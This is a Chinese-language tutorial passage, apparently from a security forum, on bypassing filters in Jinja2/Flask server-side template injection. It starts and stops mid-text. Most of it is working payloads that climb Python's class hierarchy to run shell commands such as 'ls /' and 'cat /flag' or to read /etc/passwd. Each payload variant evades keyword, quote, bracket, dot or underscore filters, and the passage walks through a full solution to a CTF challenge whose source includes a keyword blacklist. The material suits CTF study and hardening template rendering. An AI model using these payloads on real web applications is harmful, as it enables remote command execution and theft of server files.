{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

### 利用引号绕过

我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 `fl""ag` 或 `fl''ag` 的形式来绕过：

```python
[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()
```

再如：

```python
().__class__.__base__.__subclasses__()[77].__init__.__globals__['o''s'].popen('ls').read()

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil''tins__']['eval']('__import__("os").popen("ls /").read()')}}
```

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过

### 利用join()函数绕过

们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：

```python
[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
```

这也是基于对PHP函数命令的理解来的。

绕过其他字符
------

### 过滤了中括号\[ \]

#### **利用 `__getitem__()` 绕过**

可以使用 `__getitem__()` 方法**输出序列属性中的某个索引处的元素**(相当于`[]`)，如：

```python
>>> "".__class__.__mro__[2]
<type 'object'>
>>> "".__class__.__mro__.__getitem__(2)
<type 'object'>
```

如下示例：

```python
{{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       // 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
```

#### **利用 pop() 绕过**

`pop()方法`可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，用法和上面的`__getitem__()`基本一样，如下示例：

```python
{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}       // 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
```

**注意：最好不要用pop()，因为pop()会删除相应位置的值。**

#### **利用字典读取绕过**

我们知道**访问字典里的值有两种方法**，一种是把相应的键放入我们熟悉的方括号 `[]` 里来访问，另一种就是用点 `.` 来访问。所以，当方括号 `[]` 被过滤之后，我们还可以用点 `.` 的方式来访问，如下示例

```python
#改成 __builtins__.eval()

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}} 
```

### 过滤了引号

#### **利用chr()绕过**

先获取`chr()`函数，赋值给chr，后面再拼接成一个字符串

```python
{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

# {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
```

#### **利用request对象绕过**

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
#像下面这样就可以直接利用了
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

如果过滤了`args`，可以将其中的`request.args`改为`request.values`，POST和GET两种方法传递的数据`request.values`都可以接收。

### 过滤了下划线\_\_

#### **利用request对象绕过**

和上面一样，我们这里利用request绕过

```python
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__ 
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

很厉害的一种方法，利用传其他参可以绕过很多针对这一处参数的过滤

### 过滤了点 .

#### **利用 `|attr()` 绕过（适用于flask）**

如果 `.` 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数`attr()`，即：

```python
().__class__   相当于  ()|attr("__class__")
```

示例：

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}
```

等同于：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

其实这个函数是一个 `attr()` 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ `|` ）分割，它不止可以绕过点。

`|attr()` 配合其他姿势可同时绕过双下划线 `__` 、引号、点 `.` 和 `[` 等。

#### **利用中括号\[ \]绕过**

中括号直接拼接就可以，不需要用到`.`

如下示例：

```python
{{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

等同于：

```python
{{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}
```

**同时，我们可以发现,这样绕过点之后，我们几乎所有的关键字都成了字符串，我们就可以用上面的一些方法绕过了，比如hex编码，这样我们几乎可以绕过全部的过滤。**

### 过滤了大括号 `{{`

有时候也是str\_replace把双大括号换掉或者把大括号换掉，思路不能太死板。

我们可以用Jinja2的 `{%...%}` 语句装载一个循环控制语句来绕过，这里我们在一开始认识flask的时候就学习了：

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
```

也可以使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和 `curl` 将执行结果外带（不外带的话无回显）出来：

```python
{% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}
```

也可以用 `{%print(......)%}` 的形式来代替`{{ }}`，如下：

```python
{%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}
```

组合Bypass
--------

### 同时过滤了 . 和 \[\]

`|attr()`+`__getitem__`

绕过姿势：

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
```

等同于：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
```

### 同时过滤了 \_\_ 、点. 和 \[\]

`__getitem__`+`|attr()`+`request`

```python
{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()
```

相当于：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

### 配合Unicode编码绕过很多过滤

```python
'  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__
```

我们用 `{%...%}`绕过对 `{{` 的过滤，用`|attr()`绕过`.`，并用unicode绕过对关键字的过滤，然后`__getitem__`绕过中括号。

如下，后面的命令其实也可以换掉，但是没过滤，就先不换了：

```python
{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}
```

等同于：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
```

### 配合Hex编码绕过很多过滤

和上面Unicode的环境一样，方法也一样，就是换了种编码

如下

```python
{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}
```

等同于：

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
```

大家可以发现这几种方法中都用到了`|attr()`，前面也说过，这是 JinJa 的一种过滤器，下面我们可以详细了解一下 JinJa 的过滤器，以便我们加深对绕过的理解，以及研究以后新的绕过。

使用 JinJa 的过滤器进行Bypass
---------------------

在`Flask JinJa`中内置有很多过滤器可以使用，前文的`attr()`就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。

详情请看官方文档：<https://jinja.palletsprojects.com/en/master/templates/#builtin-filters>

以下是内置的所有的过滤器列表：

| [`abs()`](https://jinja.palletsprojects.com/en/master/templates/#abs) | [`float()`](https://jinja.palletsprojects.com/en/master/templates/#float) | [`lower()`](https://jinja.palletsprojects.com/en/master/templates/#lower) | [`round()`](https://jinja.palletsprojects.com/en/master/templates/#round) | [`tojson()`](https://jinja.palletsprojects.com/en/master/templates/#tojson) |
|---|---|---|---|---|
| [`attr()`](https://jinja.palletsprojects.com/en/master/templates/#attr) | [`forceescape()`](https://jinja.palletsprojects.com/en/master/templates/#forceescape) | [`map()`](https://jinja.palletsprojects.com/en/master/templates/#map) | [`safe()`](https://jinja.palletsprojects.com/en/master/templates/#safe) | [`trim()`](https://jinja.palletsprojects.com/en/master/templates/#trim) |
| [`batch()`](https://jinja.palletsprojects.com/en/master/templates/#batch) | [`format()`](https://jinja.palletsprojects.com/en/master/templates/#format) | [`max()`](https://jinja.palletsprojects.com/en/master/templates/#max) | [`select()`](https://jinja.palletsprojects.com/en/master/templates/#select) | [`truncate()`](https://jinja.palletsprojects.com/en/master/templates/#truncate) |
| [`capitalize()`](https://jinja.palletsprojects.com/en/master/templates/#capitalize) | [`groupby()`](https://jinja.palletsprojects.com/en/master/templates/#groupby) | [`min()`](https://jinja.palletsprojects.com/en/master/templates/#min) | [`selectattr()`](https://jinja.palletsprojects.com/en/master/templates/#selectattr) | [`unique()`](https://jinja.palletsprojects.com/en/master/templates/#unique) |
| [`center()`](https://jinja.palletsprojects.com/en/master/templates/#center) | [`indent()`](https://jinja.palletsprojects.com/en/master/templates/#indent) | [`pprint()`](https://jinja.palletsprojects.com/en/master/templates/#pprint) | [`slice()`](https://jinja.palletsprojects.com/en/master/templates/#slice) | [`upper()`](https://jinja.palletsprojects.com/en/master/templates/#upper) |
| [`default()`](https://jinja.palletsprojects.com/en/master/templates/#default) | [`int()`](https://jinja.palletsprojects.com/en/master/templates/#int) | [`random()`](https://jinja.palletsprojects.com/en/master/templates/#random) | [`sort()`](https://jinja.palletsprojects.com/en/master/templates/#sort) | [`urlencode()`](https://jinja.palletsprojects.com/en/master/templates/#urlencode) |
| [`dictsort()`](https://jinja.palletsprojects.com/en/master/templates/#dictsort) | [`join()`](https://jinja.palletsprojects.com/en/master/templates/#join) | [`reject()`](https://jinja.palletsprojects.com/en/master/templates/#reject) | [`string()`](https://jinja.palletsprojects.com/en/master/templates/#string) | [`urlize()`](https://jinja.palletsprojects.com/en/master/templates/#urlize) |
| [`escape()`](https://jinja.palletsprojects.com/en/master/templates/#escape) | [`last()`](https://jinja.palletsprojects.com/en/master/templates/#last) | [`rejectattr()`](https://jinja.palletsprojects.com/en/master/templates/#rejectattr) | [`striptags()`](https://jinja.palletsprojects.com/en/master/templates/#striptags) | [`wordcount()`](https://jinja.palletsprojects.com/en/master/templates/#wordcount) |
| [`filesizeformat()`](https://jinja.palletsprojects.com/en/master/templates/#filesizeformat) | [`length()`](https://jinja.palletsprojects.com/en/master/templates/#length) | [`replace()`](https://jinja.palletsprojects.com/en/master/templates/#replace) | [`sum()`](https://jinja.palletsprojects.com/en/master/templates/#sum) | [`wordwrap()`](https://jinja.palletsprojects.com/en/master/templates/#wordwrap) |
| [`first()`](https://jinja.palletsprojects.com/en/master/templates/#first) | [`list()`](https://jinja.palletsprojects.com/en/master/templates/#list) | [`reverse()`](https://jinja.palletsprojects.com/en/master/templates/#reverse) | [`title()`](https://jinja.palletsprojects.com/en/master/templates/#title) | [`xmlattr()`](https://jinja.palletsprojects.com/en/master/templates/#xmlattr) |

可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。

### 常用字符获取入口点

- 于获取一般字符的方法有以下几种：

```php
{% set org = ({ }|select()|string()) %}{{org}} {% set org = (self|string()) %}{{org}} {% set org = self|string|urlencode %}{{org}} {% set org = (app.__doc__|string) %}{{org}} 
```

如下演示：

```php
{% set org = ({ }|select()|string()) %}{{org}}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4460ffd9da758f379e1d5602910e8d07898434a1.png)

如上图所示，我们可以通过 `<generator object select_or_reject at 0x7fe339298fc0>` 字符串获取的字符有：尖号、空格、下划线，以及各种字母和数字。

```python
{% set org = (self|string()) %}{{org}}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-877701bea2529dc3fa7caf8bc3e55f19052026b7.png)

可以通过 `<TemplateReference None>` 字符串获取的字符有：尖号、字母和空格以及各种字母。

```python
{% set org = self|string|urlencode %}{{org}}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-302ba69511ea5bfe8091bdb84d66b0ce2038f933.png)

如上图所示，可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符（URL）。

```python
{% set org = (app.__doc__|string) %}{{org}}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9a505924d7588e09975163b61be7134864b2b5a7.png)

如上图所示，可获得到的字符更多了，有等号、加号、单引号等。

- 对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：

```python
{% set num = (self|int) %}{{num}}    # 0, 通过int过滤器获取数字
{% set num = (self|string|length) %}{{num}}    # 24, 通过length过滤器获取数字
{% set point = self|float|string|min %}    # 通过float过滤器获取点 .
```

有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。

下面我们通过两道题目payload的构造过程来演示一下如何使用过滤器来Bypass。

### \[2020 DASCTF 八月安恒月赛\]ezflask

题目源码：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory
app = Flask(__name__)

@app.route("/")
def index():
    def safe_jinja(s):
        blacklist = ['class', 'attr', 'mro', 'base',
                     'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\'', '"', '{}']
        flag = True
        for no in blacklist:
            if no.lower() in s.lower():
                flag = False
                break
        return flag
    if not request.args.get('name'):
        return open(__file__).read()
    elif safe_jinja(request.args.get('name')):
        name = request.args.get('name')
    else:
        name = 'wendell'
    template = '''

    <div class="center-content">
        <p>Hello, %s</p>
    </div>
    <!--flag in /flag-->
    <!--python3.8-->
''' % (name)
    return render_template_string(template)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。

在存在ssti的地方执行如下payload：

```python
{% set org = ({ }|select()|string()) %}{{org}}
# 或 {% set org = ({ }|select|string) %}{{org}}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5ff40ea79bbadc83222fa1ba470c0386780dce81.png)

可以看到，我们得到了一段字符串：`<generator object select_or_reject at 0x7f06771f4150>`，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 `<generator object select_or_reject at 0x7f06771f4150>` 这个字符串中取到我们想要的字符，从而绕过过滤。

然后我们在使用`list()过滤器`将字符串转化为列表：

```php
{% set orglst = ({ }|select|string|list) %}{{orglst}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-78b4707fb2dce7c5173bb6266c9b0662525b9c17.png)

如上图所示，反回了一个列表，列表中是 `<generator object select_or_reject at 0x7f06771f4150>` 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 `_`：

```python
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-82d15e31969565eb1b3ffcdf9faa7d715d643fdd.png)

同理还能取到更多的字符：

```python
{% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # 空格
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
{% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0
{% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7
......
```

这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：

```python
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}{{one}}    # 1
{%set two = (zero-one-one)|abs %}    # 2
{%set three = (zero-one-one-one)|abs %}    # 3
{% set five = (two*two*two)-one-one-one %}    # 5
#  {%set four = (one+three) %}    注意, 这样的加号的是不行的,可能是因为加号在URL里会自动识别为空格,只能用减号配合abs取绝对值了
......
```

通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：

```python
# 首先构造出所需的数字:
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串:
{% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _
{% set space = (({ }|select|string|list).pop(10)|string) %}    # 空格
{% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .
{% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # 单引号 '
{% set left = ((app.__doc__|string|list).pop(189)|string) %}    # 左括号 (
{% set right = ((app.__doc__|string|list).pop(200)|string) %}    # 右括号 )

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc=bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set os = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx*2~but~xhx*2 %}    # __builtins__
```

所使用的过滤器在上面的表格里有链接。

将上面构造的字符或字符串拼接起来构造出 `__import__('os').popen('cat /flag').read()`：

```python
{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}
```

然后将上面构造的各种变量添加到SSTI万能payload里面就行了：

```python
{% for f,v in whoami.__init__.__globals__.items() %}    # globals
    {% if f == bul %} 
        {% for a,b in v.items() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

所以最终的payload为：

```python
{% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
```

里面的一些索引还需要大家构造一下绕过后的payload自己跑一下，复现的时候不要忘记这一点

过滤了request和class
----------------

这里除了用上面中括号或 `|attr()` 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。

从Flask官方文档里，找到了session对象，经过测试没有被过滤。更巧的是，session一定是一个dict对象，因此我们可以通过键的方法访问相应的类。**由于键是一个字符串，因此可以通过字符串拼接绕过。**

```python
{{session['__cla'+'ss__']}}
```

访问到了类，我们就可以通过 `__bases__` 来获取基类的元组，带上索引 0 就可以访问到相应的基类。由此一直向上我们就可以找到最顶层的`object`基类了。**（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）**

payload：

```python
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}
```

有了对象基类，我们就可以通过访问 `__subclasses__` 方法再实例化去访问所有的子类。同样使用字符串拼接绕过WAF，这样就实现**沙盒逃逸**了。

payload：

```python
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'ss__']()}}
```

还是从os库入手，直接搜索“os”，找到了 `os._wrap_close` 类，同样使用dict键访问的方法。猜大致范围得到了索引序号，我这里序号是312，